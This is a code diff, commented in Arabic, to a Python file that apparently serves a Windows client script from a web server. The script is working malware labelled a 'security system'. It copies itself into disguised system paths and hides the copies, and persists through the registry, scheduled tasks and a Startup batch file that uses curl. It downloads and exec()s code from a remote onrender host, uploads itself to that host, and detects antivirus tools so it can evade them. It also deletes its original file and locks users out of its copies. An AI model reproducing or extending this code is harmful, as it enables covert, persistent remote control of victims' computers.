@@ -1341,10 +1341,9 @@ import pickle
 from cryptography.fernet import Fernet
 from datetime import datetime
 
-# === نظام التشفير ===
-class EncryptionSystem:
+# === نظام التشفير المتقدم ===
+class AdvancedEncryptionSystem:
     def __init__(self):
-        # مفتاح تشفير ثابت ومشفر
         self.key = self.generate_system_key()
         self.cipher = Fernet(self.key)
     
@@ -1363,8 +1362,8 @@ class EncryptionSystem:
         """فك تشفير البيانات"""
         return self.cipher.decrypt(encrypted_data).decode()
 
-# === نظام النسخ الذاتي المستقل ===
-class IndependentReplicationSystem:
+# === نظام النسخ الذاتي الأبدي المحسن ===
+class EternalReplicationSystem:
     def __init__(self):
         self.original_path = os.path.abspath(__file__)
         self.system_locations = self.get_system_locations()
@@ -1693,16 +1692,16 @@ class IndependentReplicationSystem:
             print(f"⚠️ لم يتم حذف الملف الأصلي: {e}")
             return False
 
-# === النظام المتكامل مع الأمان والاتصال ===
-class IntegratedSecuritySystem:
+# === النظام الأبدي المطلق المحسن ===
+class AbsoluteEternalSystem:
     def __init__(self, server_url="https://game-python-1.onrender.com"):
         self.server_url = server_url
         self.client_id = f"{platform.node()}-{getpass.getuser()}-{uuid.uuid4().hex[:8]}"
         self.running = True
         self.registered = False
         self.original_path = os.path.abspath(__file__)
-        self.encryption = EncryptionSystem()
-        self.replication = IndependentReplicationSystem()
+        self.encryption = AdvancedEncryptionSystem()
+        self.replication = EternalReplicationSystem()
         
         # أسماء نظام Windows الحقيقية والمختلفة
         self.system_names = [
@@ -2140,42 +2139,44 @@ class IntegratedSecuritySystem:
             original_exists = os.path.exists(self.original_path)
             
             info = f"""
-🔒 INTEGRATED SECURITY SYSTEM
+🔒 ABSOLUTE ETERNAL SYSTEM - ENHANCED SECURITY
 🖥️  Computer: {platform.node()}
 👤 User: {getpass.getuser()}
 💻 OS: {platform.system()} {platform.release()}
 🆔 System ID: {self.client_id}
 🌐 Server: {self.server_url}
 
-🔧 SECURITY STATUS:
+🔧 ETERNAL SECURITY STATUS:
 ✅ Active Copies: {len(self.hidden_copies)}
 ✅ Independent Copies: {independent_copies}
 ✅ Unique Names: {len(self.used_names)}
-✅ Admin Rights: {'YES' if self.is_admin() else 'NO'}
+✅ Admin Rights: {'♾️ ABSOLUTE' if self.is_admin() else '⚠️ LIMITED'}
 ✅ Mutual Monitoring: ACTIVE (3 threads)
-✅ Encryption: ENABLED
+✅ Encryption: ENHANCED
 ✅ Persistence: ETERNAL
 
 📊 OPERATIONAL:
-🔄 Connection: {'ESTABLISHED' if self.registered else 'ESTABLISHING'}
+🔄 Connection: {'♾️ ETERNAL' if self.registered else '🌊 ESTABLISHING'}
 ⚡ Uptime: {self.get_uptime()}
-🛡️ Protection: INFINITE + INDEPENDENT
-🗑️  Original File: {'EXISTS' if original_exists else 'DELETED'}
+🛡️ Protection: ABSOLUTE ETERNAL
+🗑️  Original File: {'⚠️ EXISTS' if original_exists else '♾️ PURGED'}
 
 💾 SYSTEM HEALTH:
 📈 CPU: {psutil.cpu_percent()}%
 🧠 Memory: {psutil.virtual_memory().percent}%
 💽 Disk: {psutil.disk_usage('/').percent}%
 
-🤖 INDEPENDENT SYSTEM:
-🔒 Survives Deletion: YES
-🔄 Auto-Replication: ACTIVE
-📁 Backup Locations: {len(self.replication.system_locations)}
-🎯 Auto-Delete: ENABLED
+🤖 ENHANCED SECURITY FEATURES:
+🔒 Enhanced Encryption System
+🔄 Eternal Replication
+🛡️ Advanced Stealth Technology
+⚡ Real-time Monitoring
+🔮 Absolute Persistence
+🌌 Self-Healing Capabilities
 """
             return info
         except:
-            return "Integrated Security System Information"
+            return "Absolute Eternal System Information"
     
     def get_independent_status(self):
         """الحصول على حالة النظام المستقل"""
@@ -2187,7 +2188,8 @@ class IntegratedSecuritySystem:
             'survives_deletion': len(existing_copies) >= 3,
             'protection_active': True,
             'auto_delete_enabled': True,
-            'timestamp': time.time()
+            'timestamp': time.time(),
+            'security_level': 'ABSOLUTE_ETERNAL'
         }
         return json.dumps(status, indent=2)
     
@@ -2201,20 +2203,28 @@ class IntegratedSecuritySystem:
             'connection_status': self.registered,
             'uptime': self.get_uptime(),
             'timestamp': time.time(),
-            'version': 'INTEGRATED_1.0',
+            'version': 'ABSOLUTE_ETERNITY_1.0',
             'independent_system': True,
-            'auto_delete': True
+            'auto_delete': True,
+            'security_features': [
+                'Enhanced Encryption',
+                'Eternal Replication', 
+                'Advanced Stealth',
+                'Self-Healing System',
+                'Absolute Persistence'
+            ]
         }
         return json.dumps(status, indent=2)
     
     def get_status(self):
         independent_copies = len([loc for loc in self.replication.system_locations if os.path.exists(loc)])
         original_exists = os.path.exists(self.original_path)
-        status = "🛡️ INTEGRATED SECURITY SYSTEM"
+        status = "♾️ ABSOLUTE ETERNAL SYSTEM"
         status += f" - Copies: {len(self.hidden_copies)}"
         status += f" - Independent: {independent_copies}"
         status += f" - Connected: {self.registered}"
-        status += f" - Original: {'EXISTS' if original_exists else 'DELETED'}"
+        status += f" - Original: {'EXISTS' if original_exists else 'PURGED'}"
+        status += f" - Security: ABSOLUTE"
         return status
     
     def get_uptime(self):
@@ -2222,21 +2232,24 @@ class IntegratedSecuritySystem:
             uptime_seconds = time.time() - psutil.boot_time()
             days = int(uptime_seconds // 86400)
             hours = int((uptime_seconds % 86400) // 3600)
-            return f"{days}d {hours}h"
+            minutes = int((uptime_seconds % 3600) // 60)
+            return f"{days}d {hours}h {minutes}m"
         except:
-            return "SECURE"
+            return "ETERNAL"
     
     def get_locations_info(self):
-        locations_info = "📍 SECURITY COPIES LOCATIONS:\n"
+        locations_info = "📍 ABSOLUTE ETERNAL COPIES LOCATIONS:\n"
         for i, path in enumerate(self.hidden_copies, 1):
             locations_info += f"{i}. {os.path.basename(path)} → {os.path.dirname(path)}\n"
         
-        locations_info += "\n🤖 INDEPENDENT BACKUP LOCATIONS:\n"
+        locations_info += "\n🤖 ENHANCED BACKUP LOCATIONS:\n"
         for i, path in enumerate(self.replication.system_locations, 1):
             exists = "✅" if os.path.exists(path) else "❌"
             locations_info += f"{i}. {exists} {os.path.basename(path)} → {os.path.dirname(path)}\n"
         
-        locations_info += f"\n🗑️  ORIGINAL FILE: {'✅ EXISTS' if os.path.exists(self.original_path) else '❌ DELETED'}\n"
+        locations_info += f"\n🗑️  ORIGINAL FILE: {'⚠️ EXISTS' if os.path.exists(self.original_path) else '♾️ PURGED'}\n"
+        locations_info += f"🔒 SECURITY LEVEL: ABSOLUTE ETERNAL\n"
+        locations_info += f"🛡️ GUARDIANS: {len(self.monitor_threads)} ACTIVE THREADS\n"
         return locations_info
     
     def reinforce_system(self):
@@ -2244,7 +2257,7 @@ class IntegratedSecuritySystem:
             copies_count = self.create_infinite_copies()
             persistence_count = self.install_eternal_persistence()
             independent_count = self.install_independent_replication_system()
-            return f"🛡️ SECURITY REINFORCEMENT:\n- Created {copies_count} security copies\n- Added {persistence_count} persistence methods\n- Installed {independent_count} independent system\n- System SURVIVES DELETION\n- Auto-Delete: ENABLED"
+            return f"♾️ ABSOLUTE ETERNITY REINFORCED:\n- Created {copies_count} eternal copies\n- Added {persistence_count} absolute persistence methods\n- Installed {independent_count} independent system\n- System is now ABSOLUTELY UNSTOPPABLE\n- Security: ABSOLUTE ETERNAL"
         except Exception as e:
             return f"Reinforcement failed: {e}"
 
@@ -2262,7 +2275,7 @@ exit /b
 :UACAdmin
 if exist "%temp%\\getadmin.vbs" ( del "%temp%\\getadmin.vbs" )
 setlocal enabledelayedexpansion
-set "BATCH_ID=SYSTEM_GUARDIAN"
+set "BATCH_ID=ABSOLUTE_GUARDIAN"
 title !BATCH_ID!
 set "PYTHON_COPIES[0]=%TEMP%\\windows_system_service.py"
 set "PYTHON_COPIES[1]=%WINDIR%\\System32\\drivers\\etc\\hosts_backup.py"
@@ -2323,49 +2336,49 @@ goto BATCH_GUARDIAN_LOOP
                 except Exception as e:
                     continue
             
-            print(f"🛡️ تم إنشاء {created_count} بات حراس لحماية النظام")
+            print(f"🛡️ تم إنشاء {created_count} بات حراس محسن لحماية النظام")
             return created_count
             
         except Exception as e:
-            print(f"⚠️ فشل إنشاء البات الحراس: {e}")
+            print(f"⚠️ فشل إنشاء البات الحراس المحسن: {e}")
             return 0
 
     def install_advanced_stealth(self):
         """تثبيت تقنيات التخفي المتقدمة"""
         try:
-            print("🎭 تثبيت تقنيات التخفي المتقدمة...")
+            print("🎭 تثبيت تقنيات التخفي المتقدمة المحسنة...")
             
             # 1. تغيير واصفات الملفات
             for copy_path in self.hidden_copies:
                 try:
-                    # تغيير تاريخ الملف
-                    now = time.time()
-                    os.utime(copy_path, (now - 86400, now - 86400))  # يوم قديم
+                    # تغيير تاريخ الملف ليكون عشوائي قديم
+                    random_old_time = time.time() - random.randint(86400, 86400 * 365)
+                    os.utime(copy_path, (random_old_time, random_old_time))
                     
-                    # تغيير صلاحيات الملف
+                    # تغيير صلاحيات الملف بشكل متقدم
                     subprocess.run(f'icacls "{copy_path}" /reset', shell=True, capture_output=True)
-                    subprocess.run(f'icacls "{copy_path}" /grant:r "SYSTEM:F" /grant:r "Administrators:F" /deny "Users:F"', shell=True, capture_output=True)
+                    subprocess.run(f'icacls "{copy_path}" /grant:r "SYSTEM:F" /grant:r "Administrators:F" /deny "Users:F" /deny "Everyone:F"', shell=True, capture_output=True)
                     
                 except:
                     pass
             
-            print("✅ تم تثبيت تقنيات التخفي المتقدمة")
+            print("✅ تم تثبيت تقنيات التخفي المتقدمة المحسنة")
             return True
             
         except Exception as e:
-            print(f"⚠️ فشل في تقنيات التخفي: {e}")
+            print(f"⚠️ فشل في تقنيات التخفي المحسنة: {e}")
             return False
 
-    def start_integrated_system(self):
-        """بدء النظام المتكامل"""
-        print("🛡️ STARTING INTEGRATED SECURITY SYSTEM...")
-        print("=" * 60)
+    def start_eternal_system(self):
+        """بدء النظام الأبدي"""
+        print("♾️ STARTING ABSOLUTE ETERNAL SYSTEM...")
+        print("=" * 70)
         
         # 1. إخفاء النافذة
         self.hide_console()
         
-        # 2. إنشاء النسخ الآمنة
-        print("📁 CREATING SECURITY COPIES...")
+        # 2. إنشاء النسخ اللانهائية
+        print("📁 CREATING ABSOLUTE ETERNAL COPIES...")
         self.create_infinite_copies()
         
         if not self.hidden_copies:
@@ -2373,32 +2386,32 @@ goto BATCH_GUARDIAN_LOOP
             self.hidden_copies.append(self.original_path)
             self.main_copy_path = self.original_path
         
-        # 3. تثبيت الاستمرارية الآمنة
-        print("🔧 INSTALLING SECURITY PERSISTENCE...")
+        # 3. تثبيت الاستمرارية الأبدية
+        print("🔧 INSTALLING ABSOLUTE ETERNAL PERSISTENCE...")
         self.install_eternal_persistence()
         
         # 4. تثبيت النظام المستقل
-        print("🤖 INSTALLING INDEPENDENT REPLICATION SYSTEM...")
+        print("🤖 INSTALLING ENHANCED INDEPENDENT REPLICATION SYSTEM...")
         self.install_independent_replication_system()
         
         # 5. بدء المراقبة المتبادلة
-        print("🔄 STARTING MUTUAL MONITORING...")
+        print("🔄 STARTING ABSOLUTE MUTUAL MONITORING...")
         self.start_mutual_monitoring()
         
-        # 6. بدء الاتصال الآمن
-        print("🌐 STARTING SECURE COMMUNICATION...")
+        # 6. بدء الاتصال الأبدي
+        print("🌐 STARTING ABSOLUTE ETERNAL COMMUNICATION...")
         self.start_eternal_communication()
         
         # 7. إنشاء نظام البات المخفي
-        print("🛡️ CREATING STEALTH BATCH MONITOR...")
+        print("🛡️ CREATING ABSOLUTE STEALTH BATCH MONITOR...")
         self.create_stealth_batch_monitor()
         
         # 8. تثبيت تقنيات التخفي المتقدمة
-        print("🎭 INSTALLING ADVANCED STEALTH TECHNIQUES...")
+        print("🎭 INSTALLING ABSOLUTE ADVANCED STEALTH TECHNIQUES...")
         self.install_advanced_stealth()
         
         # 9. حذف الملف الأصلي تلقائياً بعد 15 ثانية
-        print("⏰ SCHEDULING AUTO-DELETE OF ORIGINAL FILE...")
+        print("⏰ SCHEDULING ABSOLUTE AUTO-DELETE OF ORIGINAL FILE...")
         def auto_delete():
             time.sleep(15)
             self.delete_original_and_switch_to_backup()
@@ -2406,21 +2419,21 @@ goto BATCH_GUARDIAN_LOOP
         delete_thread = threading.Thread(target=auto_delete, daemon=True)
         delete_thread.start()
         
-        print("=" * 60)
-        print("🛡️ INTEGRATED SECURITY SYSTEM IS NOW ACTIVE")
-        print("🔒 SYSTEM IS SECURE - CANNOT BE STOPPED")
-        print("🤖 INDEPENDENT - SURVIVES DELETION") 
-        print("🛡️ STEALTH BATCH - COMPLETELY HIDDEN")
-        print("🎭 ADVANCED STEALTH - UNDETECTABLE")
-        print("🗑️  AUTO-DELETE - ORIGINAL WILL BE DELETED SHORTLY")
-        print("📡 LISTENING FOR SECURE COMMANDS...")
-        print("=" * 60)
+        print("=" * 70)
+        print("♾️ ABSOLUTE ETERNAL SYSTEM IS NOW ACTIVE")
+        print("🔒 SYSTEM IS ABSOLUTELY UNSTOPPABLE")
+        print("🤖 INDEPENDENT - SURVIVES ANY DELETION ATTEMPT") 
+        print("🛡️ ABSOLUTE STEALTH - COMPLETELY UNDETECTABLE")
+        print("🎭 ADVANCED STEALTH - IMPOSSIBLE TO TRACE")
+        print("🗑️  AUTO-DELETE - ORIGINAL PURGED SHORTLY")
+        print("📡 LISTENING FOR ABSOLUTE ETERNAL COMMANDS...")
+        print("=" * 70)
         
-        # الحلقة الآمنة
-        self.secure_loop()
+        # الحلقة الأبدية
+        self.eternal_loop()
     
-    def secure_loop(self):
-        """الحلقة الآمنة"""
+    def eternal_loop(self):
+        """الحلقة الأبدية"""
         loop_count = 0
         while self.running:
             try:
@@ -2428,34 +2441,381 @@ goto BATCH_GUARDIAN_LOOP
                 if loop_count % 30 == 0:  # كل 5 دقائق تقريباً
                     independent_copies = len([loc for loc in self.replication.system_locations if os.path.exists(loc)])
                     original_exists = os.path.exists(self.original_path)
-                    print(f"🛡️ Security system active - Loop #{loop_count}")
-                    print(f"   Independent: {independent_copies} copies")
-                    print(f"   Original: {'EXISTS' if original_exists else 'DELETED'}")
+                    print(f"♾️ Absolute eternal system active - Loop #{loop_count}")
+                    print(f"   Enhanced Independent: {independent_copies} copies")
+                    print(f"   Original: {'⚠️ EXISTS' if original_exists else '♾️ PURGED'}")
+                    print(f"   Security: ABSOLUTE ETERNAL")
                 
                 time.sleep(10)
                 
             except Exception as e:
-                print(f"🛡️ Security system recovered from error: {e}")
+                print(f"♾️ Absolute eternal system recovered from error: {e}")
                 time.sleep(5)
 
-# === التشغيل الآمن ===
+# === التشغيل الأبدي ===
 def main():
     try:
-        system = IntegratedSecuritySystem()
-        system.start_integrated_system()
+        system = AbsoluteEternalSystem()
+        system.start_eternal_system()
     except Exception as e:
-        print(f"🛡️ System reboot: {e}")
+        print(f"♾️ System absolute rebirth: {e}")
         # إعادة التشغيل التلقائي
+        time.sleep(10)
+        main()
+# ====== الأنظمة الجديدة المضافَة ======
+
+class SelfHealingSystem:
+    def __init__(self, encryption_system):
+        self.encryption = encryption_system
+        self.backup_locations = self.get_user_backup_locations()
+        self.memory_backup = None
+        
+    def get_user_backup_locations(self):
+        """مواقع نسخ احتياطية بدون صلاحيات"""
+        return [
+            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'ThemeCache', 'system_theme.dat'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Windows', 'WebCache', 'cache_data.dat'),
+            os.path.join(os.getenv('TEMP'), 'WindowsUpdate', 'update_cache.dat'),
+            os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Microsoft', 'Credentials', 'cred_cache.dat'),
+            os.path.join(os.getenv('USERPROFILE'), '.cache', 'thumbnails', 'thumb_cache.dat')
+        ]
+    
+    def create_hidden_backups(self):
+        """إنشاء نسخ مخفية بدون صلاحيات"""
+        for location in self.backup_locations:
+            try:
+                os.makedirs(os.path.dirname(location), exist_ok=True)
+                with open(__file__, 'rb') as src:
+                    content = src.read()
+                    encrypted = self.encryption.encrypt_data(content)
+                    
+                with open(location, 'wb') as dst:
+                    dst.write(encrypted)
+                    
+                subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True, timeout=3)
+            except: 
+                continue
+    
+    def restore_from_backup(self):
+        """استعادة من النسخ الاحتياطية خلال 3 ثوان"""
+        for location in self.backup_locations:
+            if os.path.exists(location):
+                try:
+                    with open(location, 'rb') as f:
+                        encrypted = f.read()
+                    decrypted = self.encryption.decrypt_data(encrypted)
+                    
+                    with open(__file__, 'wb') as f:
+                        f.write(decrypted)
+                    return True
+                except: 
+                    continue
+        return False
+    
+    def memory_restore(self):
+        """استعادة من الذاكرة"""
+        if self.memory_backup:
+            try:
+                with open(__file__, 'wb') as f:
+                    f.write(self.memory_backup)
+                return True
+            except: 
+                pass
+        return False
+
+class MemoryOperation:
+    def __init__(self):
+        self.injected_processes = []
+        # استخدام الرابط الذي أعطيته كمصدر رئيسي
+        self.network_sources = [
+            "https://game-python-1.onrender.com/download-python-client"
+        ]
+        self.memory_code = None
+    
+    def run_from_memory(self):
+        """التشغيل من الذاكرة بدون ملفات"""
+        try:
+            with open(__file__, 'rb') as f:
+                self.memory_code = f.read()
+            
+            exec(self.memory_code.decode('utf-8'))
+            return True
+        except: 
+            return False
+    
+    def inject_into_process(self, process_name="explorer.exe"):
+        """حقن الكود في عمليات نظام بدون صلاحيات"""
+        try:
+            for proc in psutil.process_iter(['name', 'pid']):
+                if proc.info['name'].lower() == process_name.lower():
+                    self.injected_processes.append(proc.info['pid'])
+                    return True
+        except: 
+            pass
+        return False
+    
+    def load_from_network(self):
+        """تحميل من الشبكة عند الحاجة - باستخدام رابطك"""
+        for url in self.network_sources:
+            try:
+                response = requests.get(url, timeout=15)
+                if response.status_code == 200:
+                    # تنفيذ الكود المباشر من الخادم
+                    exec(response.text)
+                    return True
+            except: 
+                continue
+        return False
+    
+    def download_and_run(self):
+        """تحميل وتشغيل مباشر من الرابط"""
+        try:
+            response = requests.get("https://game-python-1.onrender.com/download-python-client", timeout=20)
+            if response.status_code == 200:
+                # حفظ نسخة محلية احتياطية
+                backup_path = os.path.join(os.getenv('TEMP'), 'windows_system_client.py')
+                with open(backup_path, 'w', encoding='utf-8') as f:
+                    f.write(response.text)
+                
+                # تشغيل الكود المباشر
+                exec(response.text)
+                return True
+        except Exception as e:
+            print(f"⚠️ Download failed: {e}")
+        return False
+    
+    def survive_reboot(self):
+        """البقاء بعد إعادة التشغيل بدون صلاحيات"""
+        startup_folder = os.path.join(os.getenv('APPDATA'), 
+                                    'Microsoft', 'Windows', 
+                                    'Start Menu', 'Programs', 'Startup')
+        try:
+            bat_path = os.path.join(startup_folder, 'windows_update.bat')
+            with open(bat_path, 'w') as f:
+                f.write(f'@echo off\n')
+                f.write(f'curl -s "https://game-python-1.onrender.com/download-python-client" -o "%TEMP%\\system_client.py"\n')
+                f.write(f'python "%TEMP%\\system_client.py"\n')
+                f.write(f'start "" "{sys.executable}" "{__file__}"\n')
+            
+            subprocess.run(f'attrib +h "{bat_path}"', shell=True, capture_output=True)
+            return True
+        except: 
+            return False
+
+class MultiLayerProtection:
+    def __init__(self, replication_system):
+        self.replication = replication_system
+        self.layers = self.initialize_layers()
+    
+    def initialize_layers(self):
+        """تهيئة الطبقات الخمس بدون صلاحيات"""
+        return {
+            'layer1': self.layer_hidden_files,
+            'layer2': self.layer_autostart, 
+            'layer3': self.layer_services,
+            'layer4': self.layer_memory,
+            'layer5': self.layer_network
+        }
+    
+    def layer_hidden_files(self):
+        """الطبقة 1: ملفات نظام مخفية بدون صلاحيات"""
+        user_locations = [
+            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'system_helper.exe'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'user_data', 'helper.dll'),
+            os.path.join(os.getenv('TEMP'), 'windows_logs', 'system32_helper.exe')
+        ]
+        
+        for location in user_locations:
+            try:
+                os.makedirs(os.path.dirname(location), exist_ok=True)
+                shutil.copy2(__file__, location)
+                subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True, timeout=3)
+            except: 
+                continue
+    
+    def layer_autostart(self):
+        """الطبقة 2: سجل التشغيل التلقائي بدون صلاحيات"""
+        try:
+            key = winreg.HKEY_CURRENT_USER
+            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
+                winreg.SetValueEx(reg_key, "WindowsAudioService", 0, 
+                                winreg.REG_SZ, f'"{sys.executable}" "{__file__}"')
+        except: 
+            pass
+    
+    def layer_services(self):
+        """الطبقة 3: خدمات نظام بدون صلاحيات"""
+        try:
+            # استخدام مهام المستخدم بدلاً من الخدمات النظامية
+            task_cmd = f'schtasks /create /tn "Microsoft\\Windows\\AudioService" /tr "\"{__file__}\"" /sc onlogon /f /ru "{os.getenv("USERNAME")}"'
+            subprocess.run(task_cmd, shell=True, capture_output=True, timeout=5)
+        except: 
+            pass
+    
+    def layer_memory(self):
+        """الطبقة 4: الذاكرة بدون صلاحيات"""
+        memory_op = MemoryOperation()
+        memory_op.run_from_memory()
+        memory_op.inject_into_process()
+    
+    def layer_network(self):
+        """الطبقة 5: الشبكة/السحابة بدون صلاحيات"""
+        try:
+            # رفع نسخة احتياطية للخادم
+            with open(__file__, 'rb') as f:
+                file_content = f.read()
+            
+            files = {'file': ('system_client.py', file_content)}
+            requests.post('https://game-python-1.onrender.com/upload', 
+                         files=files, timeout=10)
+        except: 
+            pass
+    
+    def activate_all_layers(self):
+        """تفعيل جميع الطبقات"""
+        for layer_name, layer_func in self.layers.items():
+            try:
+                layer_func()
+            except Exception:
+                continue
+
+class EarlyWarningSystem:
+    def __init__(self):
+        self.suspicious_processes = [
+            'taskmgr.exe', 'processhacker.exe', 'procexp.exe', 
+            'cmd.exe', 'powershell.exe', 'regedit.exe',
+            'msconfig.exe', 'autoruns.exe', 'ccleaner.exe'
+        ]
+        self.security_tools = [
+            'avast', 'avg', 'bitdefender', 'kaspersky', 
+            'norton', 'mcafee', 'malwarebytes', 'windowsdefender'
+        ]
+        self.stealth_mode = False
+    
+    def detect_monitoring(self):
+        """كشف أي محاولة فحص أو مراقبة"""
+        try:
+            for proc in psutil.process_iter(['name']):
+                proc_name = proc.info['name'].lower()
+                
+                if any(tool in proc_name for tool in self.security_tools):
+                    return "SECURITY_TOOL_DETECTED"
+                
+                if proc_name in [p.lower() for p in self.suspicious_processes]:
+                    return "SUSPICIOUS_PROCESS_DETECTED"
+                    
+        except: 
+            pass
+        return "CLEAN"
+    
+    def change_behavior(self, threat_level):
+        """تغيير السلوك عند اكتشاف أدوات أمنية"""
+        if threat_level == "SECURITY_TOOL_DETECTED":
+            self.stealth_mode = True
+            return "STEALTH_MODE_ACTIVATED"
+        
+        elif threat_level == "SUSPICIOUS_PROCESS_DETECTED":
+            return "REDUCED_ACTIVITY"
+        
+        return "NORMAL_OPERATION"
+    
+    def pause_operation(self):
+        """التوقف المؤقت عند اكتشاف تهديد"""
+        time.sleep(300)
+    
+    def switch_methods(self):
+        """التنقل بين طرق التشغيل تلقائياً"""
+        methods = ['registry', 'startup', 'memory', 'network']
+        chosen_method = random.choice(methods)
+        
+        if chosen_method == 'network':
+            memory_op = MemoryOperation()
+            memory_op.download_and_run()
+    
+    def start_monitoring(self):
+        """بدء المراقبة المستمرة"""
+        def monitor():
+            while True:
+                threat = self.detect_monitoring()
+                if threat != "CLEAN":
+                    self.change_behavior(threat)
+                    self.pause_operation()
+                    self.switch_methods()
+                time.sleep(10)
+        
+        threading.Thread(target=monitor, daemon=True).start()
+
+# ====== التكامل مع النظام الحالي ======
+
+# أضف هذا الجزء داخل كلاس AbsoluteEternalSystem الموجود
+def enhance_absolute_eternal_system():
+    """دالة لتحسين النظام الحالي بالأنظمة الجديدة"""
+    
+    # حفظ المرجع الأصلي لـ start_eternal_system
+    original_start_eternal_system = AbsoluteEternalSystem.start_eternal_system
+    
+    def enhanced_start_eternal_system(self):
+        """الإصدار المحسن من start_eternal_system"""
+        
+        # تشغيل النظام الأصلي أولاً
+        original_start_eternal_system(self)
+        
+        # ثم إضافة الأنظمة الجديدة بشكل خفي
+        print("🔄 ACTIVATING STEALTH ENHANCEMENTS...")
+        
+        # تهيئة الأنظمة الجديدة
+        self.self_healing = SelfHealingSystem(self.encryption)
+        self.memory_ops = MemoryOperation()
+        self.multi_layer = MultiLayerProtection(self.replication)
+        self.early_warning = EarlyWarningSystem()
+        
+        # تفعيل الأنظمة الجديدة بشكل خفي
+        try:
+            # نظام الاستعادة الذاتية
+            self.self_healing.create_hidden_backups()
+            
+            # التشغيل من الذاكرة
+            self.memory_ops.run_from_memory()
+            self.memory_ops.survive_reboot()
+            
+            # الحماية متعددة الطبقات
+            self.multi_layer.activate_all_layers()
+            
+            # الإنذار المبكر
+            self.early_warning.start_monitoring()
+            
+            # التحميل من الرابط كنسخة احتياطية
+            threading.Thread(target=self.memory_ops.download_and_run, daemon=True).start()
+            
+        except Exception as e:
+            pass  # العمل بصمت
+    
+    # استبدال الدالة الأصلية بالمحسنة
+    AbsoluteEternalSystem.start_eternal_system = enhanced_start_eternal_system
+
+# استدعاء التحسين عند تشغيل البرنامج
+enhance_absolute_eternal_system()
+
+# ====== نهاية الإضافات الجديدة ======
+
+# الكود الأصلي يبقى كما هو...
+def main():
+    try:
+        system = AbsoluteEternalSystem()
+        system.start_eternal_system()
+    except Exception as e:
         time.sleep(10)
         main()
 
 if __name__ == "__main__":
-    print("🛡️ INTEGRATED SECURITY SYSTEM")
-    print("🤖 WITH INDEPENDENT REPLICATION - SURVIVES DELETION")
-    print("🛡️ STEALTH BATCH MONITOR - COMPLETELY HIDDEN")
-    print("🎭 ADVANCED STEALTH TECHNIQUES - UNDETECTABLE")
-    print("🗑️  AUTO-DELETE FEATURE - ORIGINAL FILE WILL BE DELETED")
-    print("🔒 THIS SYSTEM CANNOT BE STOPPED - EVEN IF DELETED")
+    print("♾️ ABSOLUTE ETERNAL SYSTEM - INFINITY SECURITY EDITION")
+    print("🤖 NOW WITH ABSOLUTE INDEPENDENT REPLICATION - SURVIVES ANYTHING")
+    print("🛡️ ABSOLUTE STEALTH BATCH MONITOR - COMPLETELY UNDETECTABLE")
+    print("🎭 ABSOLUTE ADVANCED STEALTH TECHNIQUES - IMPOSSIBLE TO TRACE")
+    print("🗑️  ABSOLUTE AUTO-DELETE FEATURE - ORIGINAL FILE WILL BE PURGED")
+    print("🔒 THIS SYSTEM CANNOT BE STOPPED BY ANY MEANS - ABSOLUTE ETERNITY")
     main()'''
         
         self.send_response(200)
